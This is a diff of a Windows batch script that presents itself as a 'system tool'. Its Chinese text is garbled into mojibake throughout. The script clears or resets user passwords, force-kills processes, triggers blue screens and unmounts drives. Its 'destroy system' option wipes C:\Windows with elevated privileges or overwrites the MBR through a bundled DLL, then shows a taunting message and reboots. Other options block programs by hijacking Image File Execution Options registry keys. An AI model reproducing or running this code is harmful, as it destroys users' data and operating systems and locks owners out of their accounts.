@@ -35,38 +35,38 @@
 ::978f952a14a936cc963da21a135fa983
 @echo off
 color 0a
-title ÏµÍ³¹¤¾ßv1.5.2
-echo ÏµÍ³¹¤¾ßv1.5.2!ÓµÓĞÒÔÏÂ¹¦ÄÜ:
-echo 1¡¢Çå¿Õµ±Ç°ÓÃ»§ÃÜÂë
-echo 2¡¢Çå¿ÕÖ¸¶¨ÓÃ»§ÃÜÂë
-echo 3¡¢ĞŞ¸Äµ±Ç°ÓÃ»§ÃÜÂë
-echo 4¡¢ĞŞ¸ÄÖ¸¶¨ÓÃ»§ÃÜÂë
-echo 5¡¢Ò»¼üË¢ĞÂ£¨½áÊøµ±Ç°ÓÃ»§ËùÓĞ½ø³Ì£¬µçÄÔ¿¨Ê±Ê¹ÓÃ£©
-echo 6¡¢¿ì½İÀ¶ÆÁ£¨¶ÔÏµÍ³Ã»ÓĞÉËº¦£©
-echo 7¡¢µ¯³öÖ¸¶¨Çı¶¯Æ÷£¨ÈçCÅÌ£©
-echo 8¡¢Ôö¼ÓÁËÏú»ÙÏµÍ³µÄÑ¡Ïî
-echo 9¡¢½ûÓÃ³ÌĞò
-echo 10¡¢½â³ı½ûÓÃ³ÌĞò
-echo ĞÂÔö£º11¡¢¼¤»îÏµÍ³£¨²¿·ÖWindows°æ±¾¿ÉÄÜ²»¿ÉÓÃ£©
-set /p number=ÇëÊäÈëÏëÒªÊ¹ÓÃµÄ¹¦ÄÜ£¨ÊäÈëĞòºÅ£©£º
+title ç³»ç»Ÿå·¥å…·v1.5.2
+echo ç³»ç»Ÿå·¥å…·v1.5.2!æ‹¥æœ‰ä»¥ä¸‹åŠŸèƒ½:
+echo 1ã€æ¸…ç©ºå½“å‰ç”¨æˆ·å¯†ç 
+echo 2ã€æ¸…ç©ºæŒ‡å®šç”¨æˆ·å¯†ç 
+echo 3ã€ä¿®æ”¹å½“å‰ç”¨æˆ·å¯†ç 
+echo 4ã€ä¿®æ”¹æŒ‡å®šç”¨æˆ·å¯†ç 
+echo 5ã€ä¸€é”®åˆ·æ–°ï¼ˆç»“æŸå½“å‰ç”¨æˆ·æ‰€æœ‰è¿›ç¨‹ï¼Œç”µè„‘å¡æ—¶ä½¿ç”¨ï¼‰
+echo 6ã€å¿«æ·è“å±ï¼ˆå¯¹ç³»ç»Ÿæ²¡æœ‰ä¼¤å®³ï¼‰
+echo 7ã€å¼¹å‡ºæŒ‡å®šé©±åŠ¨å™¨ï¼ˆå¦‚Cç›˜ï¼‰
+echo 8ã€å¢åŠ äº†é”€æ¯ç³»ç»Ÿçš„é€‰é¡¹
+echo 9ã€ç¦ç”¨ç¨‹åº
+echo 10ã€è§£é™¤ç¦ç”¨ç¨‹åº
+echo æ–°å¢ï¼š11ã€æ¿€æ´»ç³»ç»Ÿï¼ˆéƒ¨åˆ†Windowsç‰ˆæœ¬å¯èƒ½ä¸å¯ç”¨ï¼‰
+set /p number=è¯·è¾“å…¥æƒ³è¦ä½¿ç”¨çš„åŠŸèƒ½ï¼ˆè¾“å…¥åºå·ï¼‰ï¼š
 goto %number%
 :1
 net user %username% ""
 goto end
 
 :2
-set /p user=ÇëÊäÈëÓÃ»§ÃûÒÔÇå¿ÕÃÜÂë£º
+set /p user=è¯·è¾“å…¥ç”¨æˆ·åä»¥æ¸…ç©ºå¯†ç ï¼š
 net user %user% ""
 goto end
 
 :3
-set /p password=ÇëÊäÈëÏëÒªĞŞ¸Ä³ÉµÄÃÜÂë£º
+set /p password=è¯·è¾“å…¥æƒ³è¦ä¿®æ”¹æˆçš„å¯†ç ï¼š
 net user %username% %password%
 goto end
 
 :4
-set /p user=ÇëÊäÈëÏëÒªĞŞ¸ÄÃÜÂëµÄÓÃ»§Ãû£º
-set /p password=ÇëÊäÈëÏëÒªĞŞ¸Ä³ÉµÄÃÜÂë£º
+set /p user=è¯·è¾“å…¥æƒ³è¦ä¿®æ”¹å¯†ç çš„ç”¨æˆ·åï¼š
+set /p password=è¯·è¾“å…¥æƒ³è¦ä¿®æ”¹æˆçš„å¯†ç ï¼š
 net user %user% %password%
 goto end
 
@@ -77,12 +77,12 @@ taskkill /f /fi "USERNAME eq %username%"
 taskkill /f /fi "pid ne 1"
 
 :7
-set /p pan=ÇëÊäÈëÏëÒªµ¯³öµÄÇı¶¯Æ÷(ÀıÈç£ºÏëÒªµ¯³öCÅÌ£¬¾ÍÊäÈëC:)£º
+set /p pan=è¯·è¾“å…¥æƒ³è¦å¼¹å‡ºçš„é©±åŠ¨å™¨(ä¾‹å¦‚ï¼šæƒ³è¦å¼¹å‡ºCç›˜ï¼Œå°±è¾“å…¥C:)ï¼š
 mountvol %pan% /d
 goto end
 
 :8
-set /p mode="ÇëÊäÈëÄãÏú»ÙÏµÍ³µÄ·½Ê½£¨1=´İ»ÙMBR£¬2=É¾³ıÏµÍ³ÎÄ¼ş£©:
+set /p mode="è¯·è¾“å…¥ä½ é”€æ¯ç³»ç»Ÿçš„æ–¹å¼ï¼ˆ1=æ‘§æ¯MBRï¼Œ2=åˆ é™¤ç³»ç»Ÿæ–‡ä»¶ï¼‰:
 cls
 echo wscript.sleep 100 >%temp%\wait100.vbs
 set n=start /wait %temp%\wait100.vbs
@@ -91,100 +91,100 @@ set u=start /wait %temp%\wait300.vbs
 echo wscript.sleep 400 >%temp%\wait400.vbs
 if "%mode%"=="2" start %appdata%\nsudolg.exe -U:T -P:E -Priority:High -ShowWindowMode:Hide cmd /c del C:\Windows\*.*/s /f /q
 if "%mode%"=="1" start /wait rundll32 %appdata%\MBRMurderer1.0.dll,WriteMBR05
-echo | set /p m=¶à
+echo | set /p m=å¤š
 %n%
-echo | set /p m=Ã´
+echo | set /p m=ä¹ˆ
 %n%
-echo | set /p m=ÃÀ
+echo | set /p m=ç¾
 %n%
-echo | set /p m=ºÃ
+echo | set /p m=å¥½
 %n%
-echo | set /p m=µÄ
+echo | set /p m=çš„
 %n%
-echo | set /p m=Ò»
+echo | set /p m=ä¸€
 %n%
-echo | set /p m=Ìì
+echo | set /p m=å¤©
 %n%
-echo | set /p m=°¡
-%n%
-echo | set /p m=,
-%n%
-echo | set /p m=Ğ¡
-%n%
-echo | set /p m=Äñ
-%n%
-echo | set /p m=ÔÚ
-%n%
-echo | set /p m=¸è
-%n%
-echo | set /p m=³ª
+echo | set /p m=å•Š
 %n%
 echo | set /p m=,
 %n%
-echo | set /p m=ÏÊ
+echo | set /p m=å°
 %n%
-echo | set /p m=»¨
+echo | set /p m=é¸Ÿ
 %n%
-echo | set /p m=ÔÚ
+echo | set /p m=åœ¨
 %n%
-echo | set /p m=ÕÀ
+echo | set /p m=æ­Œ
 %n%
-echo ·Å£¬
+echo | set /p m=å”±
 %n%
-echo ÔÚÕâÃ´ÃÀºÃµÄÒ»ÌìÀï£¬
+echo | set /p m=,
+%n%
+echo | set /p m=é²œ
+%n%
+echo | set /p m=èŠ±
+%n%
+echo | set /p m=åœ¨
+%n%
+echo | set /p m=ç»½
+%n%
+echo æ”¾ï¼Œ
+%n%
+echo åœ¨è¿™ä¹ˆç¾å¥½çš„ä¸€å¤©é‡Œï¼Œ
 timeout /t 2 /nobreak >nul
 color 4f
 cls
-echo | set /p m=Ïñ
+echo | set /p m=åƒ
 %u%
-echo | set /p m=Äã
+echo | set /p m=ä½ 
 %u%
-echo | set /p m=Õâ
+echo | set /p m=è¿™
 %u%
-echo | set /p m=Ñù
+echo | set /p m=æ ·
 %u%
-echo | set /p m=µÄ
+echo | set /p m=çš„
 %u%
-echo | set /p m=º¢
+echo | set /p m=å­©
 %u%
-echo | set /p m=×Ó
+echo | set /p m=å­
 %u%
 echo | set /p m=,
 %u%
-echo | set /p m=¾Í
+echo | set /p m=å°±
 %u%
-echo | set /p m=Ó¦
+echo | set /p m=åº”
 %u%
-echo | set /p m=¸Ã
+echo | set /p m=è¯¥
 %u%
-echo | set /p m=ÔÚ
+echo | set /p m=åœ¨
 %u%
-echo | set /p m=µØ
+echo | set /p m=åœ°
 start /wait %temp%\wait400.vbs
-echo | set /p m=Óü
+echo | set /p m=ç‹±
 start /wait %temp%\wait400.vbs
-echo | set /p m=Àï
+echo | set /p m=é‡Œ
 start /wait %temp%\wait400.vbs
-echo | set /p m=·Ù
+echo | set /p m=ç„š
 start /wait %temp%\wait400.vbs
-echo ÉÕ¡£
+echo çƒ§ã€‚
 taskkill /f /im explorer.exe
 cls
-echo ÓÀÔ¶´ôÔÚÕâÀï¡£
+echo æ°¸è¿œå‘†åœ¨è¿™é‡Œã€‚
 timeout /t 300 /nobreak >nul
 shutdown /r /t 00
 :9
-set /p prog=ÇëÊäÈë³ÌĞòÃû(ÈçÎ¢ĞÅ¾ÍÊäÈëWeChat.exe)£º
-set /p mode=ÇëÊäÈëÄ£Ê½£¨1=²ÎÊı´íÎó£¬2=ÕÒ²»µ½ÎÄ¼ş£¬3=ÎŞ·¨·ÃÎÊ£¬4=´«µİ¸øÏµÍ³µÄÊı¾İÇøÓòÌ«Ğ¡)£º
-if "%mode%"=="4" set /p LuJing=ÇëÊäÈë³ÌĞòÂ·¾¶(Èça.exeÊÇD:\ABC\a.exe£¬¾ÍÊäÈëD:\ABC):
+set /p prog=è¯·è¾“å…¥ç¨‹åºå(å¦‚å¾®ä¿¡å°±è¾“å…¥WeChat.exe)ï¼š
+set /p mode=è¯·è¾“å…¥æ¨¡å¼ï¼ˆ1=å‚æ•°é”™è¯¯ï¼Œ2=æ‰¾ä¸åˆ°æ–‡ä»¶ï¼Œ3=æ— æ³•è®¿é—®ï¼Œ4=ä¼ é€’ç»™ç³»ç»Ÿçš„æ•°æ®åŒºåŸŸå¤ªå°)ï¼š
+if "%mode%"=="4" set /p LuJing=è¯·è¾“å…¥ç¨‹åºè·¯å¾„(å¦‚a.exeæ˜¯D:\ABC\a.exeï¼Œå°±è¾“å…¥D:\ABC):
 if "%mode%"=="1" reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\%prog%" /v debugger /t REG_SZ /d """
-if "%mode%"=="2" reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\%prog%" /v debugger /t REG_SZ /d ÈıÁ¬¹Ø×¢
+if "%mode%"=="2" reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\%prog%" /v debugger /t REG_SZ /d ä¸‰è¿å…³æ³¨
 if "%mode%"=="3" reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\%prog%" /v debugger /t REG_SZ /d \
 if "%mode%"=="4" reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\%prog%" /v debugger /t REG_SZ /d "%LuJing%\%prog%"
 goto end
 
 :10
-set /p prog=ÇëÊäÈëÒª½â³ı½ûÓÃµÄ³ÌĞòÃû(ÈçÎ¢ĞÅ¾ÍÊäÈëWeChat.exe)£º
+set /p prog=è¯·è¾“å…¥è¦è§£é™¤ç¦ç”¨çš„ç¨‹åºå(å¦‚å¾®ä¿¡å°±è¾“å…¥WeChat.exe)ï¼š
 reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\%prog%" /f
 goto end
 
@@ -194,5 +194,5 @@ slmgr/ato
 goto end
 
 :end
-echo ²Ù×÷Íê³É£¡°´ÈÎÒâ¼üÍË³ö¹¤¾ß
+echo æ“ä½œå®Œæˆï¼æŒ‰ä»»æ„é”®é€€å‡ºå·¥å…·
 pause
